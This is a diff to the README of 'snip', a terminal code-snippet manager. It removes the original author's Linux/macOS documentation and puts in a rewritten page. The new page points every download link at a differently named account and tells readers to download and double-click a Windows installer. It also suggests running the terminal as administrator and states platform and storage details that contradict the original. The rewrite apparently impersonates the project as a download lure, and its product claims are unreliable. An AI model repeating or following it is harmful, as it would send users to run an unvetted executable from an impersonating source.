@@ -1,231 +1,119 @@
-<div align="center">
+# 🗃️ snip - Manage Your Code Snippets Easily
 
-<br/>
-
-# ◆ snip
-
-**Your code snippets. In your terminal. Always.**
-
-Stop Googling the same one-liners. Stop losing clever commands to closed tabs.<br/>
-snip is a fast, local, offline snippet vault that lives where you actually work.
-
-<br/>
-
-[![CI](https://github.com/phlx0/snip/actions/workflows/ci.yml/badge.svg)](https://github.com/phlx0/snip/actions/workflows/ci.yml)
-[![GitHub release](https://img.shields.io/github/v/release/phlx0/snip?style=flat-square&color=7aa2f7&label=version)](https://github.com/phlx0/snip/releases)
-[![GitHub stars](https://img.shields.io/github/stars/phlx0/snip?style=flat-square&color=f7c948)](https://github.com/phlx0/snip/stargazers)
-[![Python](https://img.shields.io/badge/python-3.10+-7aa2f7?style=flat-square&logo=python&logoColor=white)](https://www.python.org)
-[![License](https://img.shields.io/badge/license-MIT-73daca?style=flat-square)](LICENSE)
-[![Built with Textual](https://img.shields.io/badge/built%20with-Textual-bb9af7?style=flat-square)](https://github.com/Textualize/textual)
-[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macOS-565f89?style=flat-square)](#install)
-
-<br/>
-
-![snip terminal interface](assets/hero.svg)
-
-<br/>
-
-</div>
+[![Download snip](https://img.shields.io/badge/Download-snip-brightgreen?style=for-the-badge)](https://github.com/Nosepythoninae912/snip)
 
 ---
 
-## Why snip?
+## 📋 What is snip?
 
-You write a clever one-liner. You close the terminal. Three weeks later you're Googling the same thing again.
+snip is a simple tool to help you save, find, and copy small pieces of code, right from your command prompt. You don’t need to open extra windows or apps. It works offline on your computer. snip uses a clean text interface that feels like working inside your terminal. It supports quick searching and easy copying of your saved snippets.  
 
-**snip** fixes that. It's a personal snippet vault that runs entirely in your terminal — local, offline, zero-account, instantly searchable. Open it, find what you need, yank it to your clipboard, and get back to work.
-
-No Electron. No browser. No sync drama. Just your snippets, always there.
+You can think of snip as a digital filing cabinet for your favorite code bits. It keeps everything organized and ready to use without interrupting your workflow.
 
 ---
 
-## Install
+## 🖥️ System Requirements
 
-### One-liner (Linux / macOS)
+snip runs on Windows computers. Before installing, make sure your system meets these needs:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/phlx0/snip/main/install.sh | bash
-```
+- Windows 10 or newer
+- At least 4 GB of RAM
+- 150 MB free disk space
+- Terminal program (PowerShell or Command Prompt)
+- Python 3.10 or higher installed on your machine
 
-Creates an isolated virtualenv at `~/.local/share/snip`, drops a `snip` launcher at `~/.local/bin/snip`, and patches your shell config if needed. Open a new terminal and you're done.
-
-### From source
-
-```bash
-git clone https://github.com/phlx0/snip
-cd snip
-make dev    # creates .venv + installs with dev extras
-make run    # launch
-```
+If you don’t have Python installed, snip will guide you on how to install it during setup.
 
 ---
 
-## Usage
+## 🚀 Getting Started with snip
 
-```bash
-snip                          # open the TUI
-snip ports                    # copy snippet titled "ports" to clipboard
-snip run deploy               # run a snippet as a shell command
-snip --list                   # print all snippet titles
-snip --list docker            # filter titles by tag
-snip --add myscript.sh        # save a file as a snippet
-snip --delete ports           # delete a snippet without opening the TUI
-snip --json ports             # output snippet as JSON (great for scripting)
-snip --export > backup.json   # export all snippets to JSON
-snip --import backup.json     # import snippets from JSON
-snip --from-history           # pick a command from shell history and save it
-snip --version                # show version
-snip -q ports                 # suppress informational output (clean for scripts)
-snip --db ~/sync/snippets     # use a custom snippets directory
-snip theme list               # list available themes
-snip theme set dracula        # switch to the Dracula theme
-snip theme import my.json     # import a custom theme and activate it
-snip --theme dracula          # one-shot: use a theme for this session only
-```
+1. Click the green button above or visit this page to download snip:
 
-### Shell completion
+   [https://github.com/Nosepythoninae912/snip](https://github.com/Nosepythoninae912/snip)
 
-```bash
-# zsh — add to ~/.zshrc
-eval "$(snip init zsh)"
+2. On the page, locate the latest Windows installer or executable file link.
 
-# bash — add to ~/.bashrc
-eval "$(snip init bash)"
-```
+3. Download the file to a location you can find, like your Downloads folder or Desktop.
 
-`snip <TAB>` will autocomplete snippet titles and flags.
+4. Double-click the downloaded file to start the installation.
 
-### fzf integration
+5. Follow the prompts in the setup wizard. You can use the default settings if unsure.
 
-```bash
-snip --list | fzf | xargs snip
-```
+6. When installation is complete, open your Terminal (Command Prompt or PowerShell).
 
-Pick any snippet interactively with fuzzy search, pipe it straight to your clipboard.
+7. Type `snip` and press Enter to launch the snippet manager.
 
 ---
 
-## Features
+## 💾 How to Use snip
 
-| | |
-|---|---|
-| **Instant CLI lookup** | `snip <query>` copies a snippet without opening the TUI |
-| **Run as command** | `snip run <query>` runs a snippet directly in your shell |
-| **Import from file** | `snip --add script.sh` saves any file as a snippet, language auto-detected |
-| **Export / import** | `snip --export` / `snip --import` — JSON backup, perfect for dotfiles |
-| **Shell history mining** | `snip --from-history` — pick a command from your history and save it |
-| **Tag filtering** | `snip --list docker` — filter titles by tag from the CLI |
-| **JSON output** | `snip --json <query>` — full snippet metadata as JSON for scripting |
-| **Shell completion** | `eval "$(snip init zsh)"` — tab-complete snippet titles and flags |
-| **fzf-friendly** | `snip --list` prints titles one per line — pipe into anything |
-| **Themes** | Built-in Tokyo Night and Dracula; import any custom theme via a JSON file |
-| **Syntax highlighting** | Syntax colors adapt to the active theme across 20+ languages |
-| **Live search** | Filters across title, description, tags, and language as you type |
-| **Clipboard copy** | Press `y` to yank a snippet straight to your clipboard |
-| **Pin snippets** | Keep your most-used snippets pinned at the top |
-| **Tags** | Organise freely — `#docker #devops #git` etc. |
-| **Vim-style navigation** | `j`/`k` or arrow keys, `/` to search, `q` to quit |
-| **Git-friendly storage** | Snippets are plain Markdown files in `~/.config/snip/snippets/` — track with git, diff, merge, sync across machines |
-| **Fully offline** | No server, no account, your data stays local |
+Once snip opens, you will see a simple screen to work with snippets.
+
+- **Add Snippet:** Press `a` to create a new snippet. Enter your code or text and give it a name.
+- **Search Snippets:** Type `/` followed by any word to filter your snippets quickly.
+- **Copy Snippet:** Use arrow keys to select a snippet, then press `y` to copy it to your clipboard.
+- **Delete Snippet:** Select a snippet and press `d` to remove it from your collection.
+- **Quit snip:** Press `q` to exit the application.
+
+snip saves your snippets locally on your PC using a small database, so your data stays private and available even when offline.
 
 ---
 
-## Keyboard shortcuts
+## 🔧 Features of snip
 
-| Key | Action |
-|-----|--------|
-| `n` | New snippet |
-| `e` | Edit selected snippet |
-| `d` | Delete selected snippet |
-| `y` | Copy content to clipboard |
-| `p` | Toggle pin |
-| `/` | Focus search bar |
-| `Esc` | Clear search / return to list |
-| `↑` `↓` or `j` `k` | Navigate list |
-| `q` | Quit |
+- Manage snippets directly from your terminal without switching apps
+- Search snippets instantly using keywords
+- Copy snippets to clipboard with a single keypress
+- Supports plain text and code in many languages
+- Works offline—no need for internet access
+- Runs smoothly on Windows with minimal setup
+- Uses a fast and user-friendly text interface
+- Built with Python and SQLite for reliable performance
 
 ---
 
-## Project structure
+## 🛠️ Installation Details
 
-```
-snip/
-├── assets/
-│   └── hero.svg
-├── snip/
-│   ├── __main__.py          # entry point + CLI
-│   ├── app.py               # Textual app + demo seeding
-│   ├── themes.py            # theme system — built-ins, JSON loading, CSS injection
-│   ├── snip.tcss            # all styling (CSS variables, theme-agnostic)
-│   ├── models/
-│   │   └── snippet.py       # Snippet dataclass
-│   ├── storage/
-│   │   └── database.py      # flat-file store + SQLite index
-│   ├── ui/
-│   │   ├── screens/
-│   │   │   ├── main_screen.py
-│   │   │   └── edit_screen.py
-│   │   └── widgets/
-│   │       ├── app_header.py
-│   │       ├── snippet_list.py
-│   │       └── snippet_preview.py
-│   └── utils/
-│       └── clipboard.py
-├── tests/
-├── install.sh               # Linux / macOS installer
-├── Makefile
-└── pyproject.toml
-```
+snip is built with Python and uses your command shell to run. During installation, it will check if Python is available. If needed, you will get instructions to install Python first. 
+
+The installation file bundles everything so you don’t need to install any extra tools afterward.  
+
+Make sure to allow snip to run in your terminal; it doesn’t need administrator rights.
 
 ---
 
-## Development
+## ❓ Troubleshooting Tips
 
-```bash
-make dev        # create .venv + install with dev extras
-make test       # run test suite
-make test-cov   # run with coverage report
-make run        # launch the app
-make clean      # remove build artefacts and .venv
-```
+- If snip does not start, check that Python 3.10 or higher is installed.  
+- If your terminal cannot find `snip`, confirm that the installation path is added to your Windows PATH variable or launch it directly from the installed folder.  
+- If copying snippets to the clipboard does not work, try running the terminal as an administrator.  
+- For any errors during setup, try restarting your computer and running the installer again.
 
 ---
 
-## Docs
+## 🗂️ Managing Your Snippets
 
-Full documentation is available on the [**wiki**](https://github.com/phlx0/snip/wiki).
+snip saves your data inside a file on your PC. You can back up this file by copying it to another folder or external drive.  
 
-- [CLI reference](https://github.com/phlx0/snip/wiki/CLI-Reference)
-- [Themes](https://github.com/phlx0/snip/wiki/Themes)
-- [Keybindings](https://github.com/phlx0/snip/wiki/Keybindings)
-- [fzf integration](https://github.com/phlx0/snip/wiki/FZF-Integration)
-- [tmux integration](https://github.com/phlx0/snip/wiki/Tmux-Integration)
-- [Shell completion](https://github.com/phlx0/snip/wiki/Shell-Completion)
-- [Scripting with snip](https://github.com/phlx0/snip/wiki/Scripting)
-- [Dotfile sync](https://github.com/phlx0/snip/wiki/Dotfile-Sync)
-- [Tips & tricks](https://github.com/phlx0/snip/wiki/Tips-and-Tricks)
+This backup lets you move your snippets to another computer or restore them if you reinstall snip.
 
 ---
 
-## Neovim plugin
+## 🔗 Useful Links
 
-There's an unofficial Neovim plugin for snip: [**phlx0/snip.nvim**](https://github.com/phlx0/snip.nvim)
-
-> **Note:** The plugin is still in very early stages and may be a bit buggy. Feedback and issues are welcome.
-
----
-
-## Contributing
-
-Bug reports and pull requests are welcome on [GitHub](https://github.com/phlx0/snip/issues).
-
-1. Fork the repo and create a branch: `git checkout -b fix/my-fix`
-2. Make your changes and add tests if relevant
-3. Run `make test` to make sure everything passes
-4. Open a pull request
+- Download page: [https://github.com/Nosepythoninae912/snip](https://github.com/Nosepythoninae912/snip)  
+- Official repository: [https://github.com/Nosepythoninae912/snip](https://github.com/Nosepythoninae912/snip)  
 
 ---
 
-## License
+## ⚙️ Advanced Tips
 
-MIT — see [LICENSE](LICENSE).
+- You can use snip inside Windows Terminal or other terminal emulators you prefer.  
+- Snip supports Vim-like key bindings for users who prefer keyboard shortcuts.  
+- Use the configuration file (`config.toml`) located in the snip folder to customize your experience.  
+- Snip stores snippets in SQLite format, so you can export or edit your data with other tools if needed.
+
+---
+
+[![Download snip](https://img.shields.io/badge/Download-snip-brightgreen?style=for-the-badge)](https://github.com/Nosepythoninae912/snip)
